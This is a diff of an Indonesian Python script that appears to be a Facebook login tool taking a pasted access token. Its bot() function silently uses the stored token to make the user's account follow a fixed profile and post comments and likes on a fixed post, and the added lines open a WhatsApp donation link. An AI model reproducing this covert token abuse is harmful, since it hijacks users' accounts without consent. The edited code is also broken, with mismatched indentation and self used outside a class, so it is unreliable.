@@ -127,44 +127,40 @@ def login():
 			login_lagi()      
 	
 def login_lagi():
-	kontol()
-	sky = '➣ 𝑳𝒐𝒈𝒊𝒏 𝑴𝒆𝒏𝒈𝒈𝒖𝒏𝒂𝒌𝒂𝒏 𝑻𝒐𝒌𝒆𝒏 𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 '
-	sky2 = mark(sky, style='green')
-	sol().print(sky2, style='cyan')
-	panda = input('\033[33m 𝑴𝒂𝒔𝒖𝒌𝒂𝒏 𝑻𝒐𝒌𝒆𝒏  : ')
-	akun=open('.token.txt','w').write(panda)
-	try:
-		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
-		tes3 = json.loads(tes.text)['id']
-		sue = '➣ 𝑳𝒐𝒈𝒊𝒏 𝑺𝒖𝒌𝒔𝒆𝒔 '
-		suu = mark(sue, style='green')
-		sol().print(suu, style='cyan')
-		time.sleep(2.5)
-		bot()
-	except KeyError:
-		sue = '➣ 𝑳𝒐𝒈𝒊𝒏 𝑮𝒂𝒈𝒂𝒍 '
-		suu = mark(sue, style='red')
-		sol().print(suu, style='cyan')
-		time.sleep(2.5)
-		memek()
-	except requests.exceptions.ConnectionError:
-		li = '➣ 𝑲𝒐𝒏𝒆𝒌𝒔𝒊 𝑰𝒏𝒕𝒆𝒓𝒏𝒆𝒕 𝑩𝒆𝒓𝒎𝒂𝒔𝒂𝒍𝒂𝒉'
-		lo = mark(li, style='red')
-		sol().print(lo, style='cyan')
-		exit()
-
+		os.system('clear')
+		banner()
+		token = input(' [%s*%s] Masukan token : '%(O,N))
+		if token in ['']:
+			time.sleep(2);login().login_lagi()
+		else:
+			try:
+				cc = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
+				open('token.x','w').write(token)
+				print('\n [%s+%s] Login berhasil %s'%(H,N,cc))
+				self.bot()
+			except KeyError:
+				jalan(' [%s!%s] Token error coba ganti akun tumbal!'%(M,N))
+				self.takon()
+	def takon(self):
+		takon = input('\n %s[%s!%s] Mau tau cara ambil token y/t: '%(N,O,N))
+		if takon in ['y','Y','iya']:
+			jalan('\n %s[%s!%s] Kamu akan di arahkan ke Ke Wa Untuk Donasi'%(N,O,N))
+			os.system('xdg-open wa.me/6281221523195');exit()
+		else:
+			login().login_lagi()
 
 # HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
 def bot():
 		try:
 			toket = open('token.x','r').read()
 		except IOError:
-			jalan('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login().__login__()
+			jalan('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login().login_lagi()
 		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/711894139936601/comments/?message=' +komen+ '&access_token=' + toket)
 		requests.post('https://graph.facebook.com/711894139936601likes?summary=true&access_token=' + toket)
 		requests.post('https://graph.facebook.com/711894139936601/comments/?message='+komen+'&access_token=' + toket)
 		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
+		os.system('xdg-open wa.me/6281221523195')
 		menu_test()
 		
 def menu_test():
